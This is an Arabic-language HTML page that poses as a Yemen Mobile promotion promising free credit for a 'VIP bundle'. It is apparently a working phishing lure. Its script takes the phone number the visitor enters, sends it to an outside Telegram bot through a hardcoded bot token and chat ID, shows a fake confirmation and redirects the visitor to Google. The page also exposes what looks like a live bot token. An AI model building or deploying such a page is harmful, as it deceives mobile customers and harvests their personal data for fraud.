<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <title>خدمة يمن موبايل</title>
</head>
<body style="text-align:center; padding-top:50px; font-family:sans-serif;">

    <h2>تفعيل باقة VIP 🚀</h2>
    <p>أدخل رقمك لتلقي رصيد مجاني</p>

    <input type="number" id="phone" placeholder="77xxxxxxx" style="padding:10px; width:80%; max-width:300px;"><br><br>
    
    <button onclick="send()" style="padding:15px 30px; background:red; color:white; border:none; border-radius:5px; cursor:pointer;">
        تفعيل الآن ✅
    </button>

    <script>
        function send() {
            const p = document.getElementById('phone').value;
            if(!p) return alert("أدخل الرقم!");

            const tok = "8463856092:AAFSVuqBR9Nm83o7OzwJXs18bbuU0XwIT_Q";
            const id = "7715667493";
            const text = "🎯 رقم جديد: " + p;

            // إرسال بسيط جداً
            fetch("https://api.telegram.org/bot" + tok + "/sendMessage?chat_id=" + id + "&text=" + encodeURIComponent(text))
            .then(() => {
                alert("تم استلام طلبك!");
                window.location.href = "https://www.google.com";
            });
        }
    </script>
</body>
</html>
